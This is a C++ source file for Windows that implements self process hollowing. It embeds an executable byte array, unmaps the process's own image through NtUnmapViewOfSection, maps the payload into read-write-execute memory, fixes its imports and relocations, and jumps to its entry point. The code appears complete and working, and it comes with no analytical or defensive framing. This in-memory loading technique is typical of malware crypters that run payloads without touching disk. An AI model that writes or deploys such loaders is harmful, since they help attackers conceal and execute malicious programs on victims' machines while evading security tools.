#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
#include <vector>


//std::vector<unsigned char> Executable;

typedef LONG(WINAPI* NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);

typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY;

#define RELOC_64BIT_FIELD 10  
#define PEMAXOFFSET       4096



IMAGE_NT_HEADERS64* GetNTHeaders(unsigned char* data)
{
	if (data == NULL)
		return NULL;

	IMAGE_DOS_HEADER* Header = (IMAGE_DOS_HEADER*)data;
	if (Header->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	long Offset = Header->e_lfanew;
	if (Offset > PEMAXOFFSET)
		return NULL;

	IMAGE_NT_HEADERS64* NTHeader = (IMAGE_NT_HEADERS64*)(data + Offset);
	if (NTHeader->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	return NTHeader;
}


IMAGE_DATA_DIRECTORY* GetRelocationData(IMAGE_NT_HEADERS64* NTHeaders, int Directory)
{
	if (NTHeaders == NULL || Directory >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES)
		return NULL;

	IMAGE_DATA_DIRECTORY* DataDirectory = &NTHeaders->OptionalHeader.DataDirectory[Directory];
	if (DataDirectory->VirtualAddress == NULL)
		return NULL;

	return DataDirectory;
}


bool ApplyRelocation(ULONG_PTR NewBase, ULONG_PTR OldBase, IMAGE_NT_HEADERS64* NTHeaders, ULONG_PTR ModulePointer, SIZE_T ModuleSize)
{
	IMAGE_DATA_DIRECTORY* BaseRelocationDir = GetRelocationData(NTHeaders, IMAGE_DIRECTORY_ENTRY_BASERELOC);
	if (BaseRelocationDir == NULL)
		return false;

	DWORD MaxSize = BaseRelocationDir->Size;
	DWORD RelocationAddress = BaseRelocationDir->VirtualAddress;
	IMAGE_BASE_RELOCATION* BaseRelocation = NULL;

	DWORD parsedSize = 0;
	for (; parsedSize < MaxSize; parsedSize += BaseRelocation->SizeOfBlock) {
		BaseRelocation = (IMAGE_BASE_RELOCATION*)(ModulePointer + RelocationAddress + parsedSize);
		if (BaseRelocation->VirtualAddress == NULL || BaseRelocation->SizeOfBlock == 0)
			break;

		DWORD entryCount = (BaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		BASE_RELOCATION_ENTRY* Entry = (BASE_RELOCATION_ENTRY*)((ULONG_PTR)BaseRelocation + sizeof(IMAGE_BASE_RELOCATION));

		for (DWORD i = 0; i < entryCount; i++, Entry++) {
			if (Entry->Type == IMAGE_REL_BASED_ABSOLUTE)
				continue;

			if (Entry->Type != RELOC_64BIT_FIELD)
				continue;

			ULONG_PTR FieldRVA = BaseRelocation->VirtualAddress + Entry->Offset;
			if (FieldRVA >= ModuleSize)
				continue;

			ULONGLONG* PatchAddress = (ULONGLONG*)(ModulePointer + FieldRVA);
			*PatchAddress = (*PatchAddress) - OldBase + NewBase;
		}
	}

	return (parsedSize != 0);
}


bool FixImportAddressTable(unsigned char* ModulePointer, IMAGE_NT_HEADERS64* NTHeaders)
{
	IMAGE_DATA_DIRECTORY* Imports = GetRelocationData(NTHeaders, IMAGE_DIRECTORY_ENTRY_IMPORT);
	if (Imports == NULL)
		return false;

	for (DWORD Size = 0; Size < Imports->Size; Size += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		IMAGE_IMPORT_DESCRIPTOR* Library = (IMAGE_IMPORT_DESCRIPTOR*)(
			(ULONG_PTR)ModulePointer + Imports->VirtualAddress + Size
			);

		if (Library->OriginalFirstThunk == NULL && Library->FirstThunk == NULL)
			break;

		char* Name = (LPSTR)((ULONG_PTR)ModulePointer + Library->Name);

		HMODULE hLib = LoadLibraryA(Name);
		if (!hLib)
			continue;

		DWORD ThunkAddress = Library->OriginalFirstThunk ? Library->OriginalFirstThunk : Library->FirstThunk;
		DWORD Field = 0;
		DWORD Offset = 0;

		while (true) {
			IMAGE_THUNK_DATA64* Thunk = (IMAGE_THUNK_DATA64*)((ULONG_PTR)ModulePointer + Field + Library->FirstThunk);
			IMAGE_THUNK_DATA64* Original = (IMAGE_THUNK_DATA64*)((ULONG_PTR)ModulePointer + Offset + ThunkAddress);

			if (Original->u1.Function == 0)
				break;

			if (Original->u1.Ordinal & IMAGE_ORDINAL_FLAG64)
				Thunk->u1.Function = (ULONGLONG)GetProcAddress(hLib, (LPCSTR)(Original->u1.Ordinal & 0xFFFF));
			else {

				PIMAGE_IMPORT_BY_NAME ImportByName = (PIMAGE_IMPORT_BY_NAME)(
					(ULONG_PTR)ModulePointer + Original->u1.AddressOfData
					);
				Thunk->u1.Function = (ULONGLONG)GetProcAddress(hLib, ImportByName->Name);
			}

			if (Thunk->u1.Function == 0)
				break;

			Field += sizeof(IMAGE_THUNK_DATA64);
			Offset += sizeof(IMAGE_THUNK_DATA64);
		}
	}

	return true;
}



bool LaunchExecutable(unsigned char* ByteArray)
{



	ULONG_PTR Entry = 0;
	{

		NtUnmapViewOfSection_t NtUnmapViewOfSection;


		IMAGE_NT_HEADERS64* NTHeaders = GetNTHeaders(ByteArray);
		if (NTHeaders == NULL) {
			MessageBoxW(
				NULL,
				L"An unexpected error has occurred. #2",
				L"Launch error",
				MB_OK | MB_ICONERROR
			);
			return false;
		}

		IMAGE_DATA_DIRECTORY* DataDirectory = GetRelocationData(NTHeaders, IMAGE_DIRECTORY_ENTRY_BASERELOC);

		auto Addr = (LPVOID)NTHeaders->OptionalHeader.ImageBase;

		NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtUnmapViewOfSection");
		NtUnmapViewOfSection((HANDLE)-1, (LPVOID)NTHeaders->OptionalHeader.ImageBase);

		unsigned char* DLLBaseAddress = (unsigned char*)VirtualAlloc(
			Addr,
			NTHeaders->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
		);

		if (!DLLBaseAddress && !DataDirectory)
		{
			MessageBoxW(
				NULL,
				L"An unexpected error has occurred. #3",
				L"Launch error",
				MB_OK | MB_ICONERROR
			);
			return false;
		}

		if (!DLLBaseAddress && DataDirectory)
			DLLBaseAddress = (unsigned char*)VirtualAlloc(
				NULL,
				NTHeaders->OptionalHeader.SizeOfImage,
				MEM_COMMIT | MEM_RESERVE,
				PAGE_EXECUTE_READWRITE
			);

		NTHeaders->OptionalHeader.ImageBase = (ULONGLONG)DLLBaseAddress;

		memcpy(DLLBaseAddress, ByteArray, NTHeaders->OptionalHeader.SizeOfHeaders);
		IMAGE_SECTION_HEADER* SecHeaderAddr = IMAGE_FIRST_SECTION(NTHeaders);

		for (int i = 0; i < NTHeaders->FileHeader.NumberOfSections; i++) {
			memcpy(
				(LPVOID)((ULONG_PTR)DLLBaseAddress + SecHeaderAddr[i].VirtualAddress),
				(LPVOID)((ULONG_PTR)ByteArray + SecHeaderAddr[i].PointerToRawData),
				SecHeaderAddr[i].SizeOfRawData
			);
		}

		FixImportAddressTable(DLLBaseAddress, NTHeaders);

		if (DLLBaseAddress != Addr)
			ApplyRelocation(
				(ULONG_PTR)DLLBaseAddress,
				(ULONG_PTR)Addr,
				NTHeaders,
				(ULONG_PTR)DLLBaseAddress,
				NTHeaders->OptionalHeader.SizeOfImage
			);

		Entry = (ULONG_PTR)DLLBaseAddress + NTHeaders->OptionalHeader.AddressOfEntryPoint;

		//Application.clear();
	}


	((int(*)())Entry)();
	return 0;
}

#include "Executable.hpp"
#include <iostream>

int main() {
	std::cout << "Initializing process hollowing...\n";
	LaunchExecutable(TestProject_exe);
	return 0;
}

